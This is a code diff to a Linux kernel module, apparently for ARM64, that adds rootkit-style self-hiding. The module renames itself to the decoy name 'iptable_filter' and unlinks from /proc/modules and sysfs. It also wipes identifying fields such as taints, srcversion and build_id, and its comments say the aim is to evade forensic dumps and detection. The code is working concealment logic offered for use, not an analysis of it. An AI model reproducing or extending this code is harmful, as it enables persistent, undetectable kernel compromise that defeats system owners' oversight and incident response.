@@ -32,19 +32,56 @@
 #include "lifecycle.h"
 #include "log.h"
 #include "memory.h"
+#include "module_hide.h"
 #include "stealth.h"
 #include "user_hook.h"
 
 struct drv_state drv;
 
 #if KCFG_HIDE_SELF_MODULE
-/* Unlink THIS_MODULE from /proc/modules and /sys/module/<name>. */
+
+/* Optional decoy identifier the module renames itself to before it detaches
+ * from mod_list. Anyone snapshotting `struct module*` after unlink (livepatch,
+ * dumped kcore, a backdoor reader) sees an unremarkable-looking name instead
+ * of the real one. A one-token string that reads like a plausible in-tree
+ * subsystem is better than "\0" — pure zeros are themselves suspicious. */
+#ifndef KCFG_DECOY_NAME
+#define KCFG_DECOY_NAME "iptable_filter"
+#endif
+
+/* Unlink THIS_MODULE from /proc/modules and /sys/module/<name>, then wipe the
+ * struct fields any backdoor holder might still deref. */
 static void conceal_module(void) {
 	struct module *mod = THIS_MODULE;
+	const char decoy[] = KCFG_DECOY_NAME;
+	size_t dlen = sizeof(decoy) - 1u;
+
+	/* C.2 decoy: rename BEFORE list unlink so the very brief window while
+	 * mod_list is still walkable already exposes the decoy name. */
+	if (dlen >= sizeof(mod->name))
+		dlen = sizeof(mod->name) - 1u;
+	memset(mod->name, 0, sizeof(mod->name));
+	memcpy(mod->name, decoy, dlen);
+
 	list_del(&mod->list);
 	INIT_LIST_HEAD(&mod->list);
 	kobject_del(&mod->mkobj.kobj);
 	list_del(&mod->mkobj.kobj.entry);
+
+	/* E.HIDE.1 meta cleanup — nothing legitimate reaches these fields once
+	 * we're off mod_list, but a backdoor pointer to `struct module*` still
+	 * would dereference them. Zero the ones that leak identifying info. */
+#ifdef CONFIG_MODULE_UNLOAD
+	mod->taints = 0;
+#endif
+#ifdef CONFIG_MODVERSIONS
+	memset(mod->srcversion, 0, sizeof(mod->srcversion));
+#endif
+	mod->notes_attrs = NULL;
+	mod->modinfo_attrs = NULL;
+#ifdef CONFIG_STACKTRACE_BUILD_ID
+	memset(mod->build_id, 0, sizeof(mod->build_id));
+#endif
 }
 #endif
 
@@ -123,6 +160,8 @@ int __init init_driver(void) {
 	if (ret < 0) { LOGE("register_kprobe (__arm64_sys_reboot) failed: %d\n", ret); return ret; }
 
 #if KCFG_HIDE_SELF_MODULE
+	if (module_hide_arm())
+		LOGN("module_hide arm failed; conceal_module still runs\n");
 	conceal_module();
 #endif
 #if KCFG_HIDE_VMAP
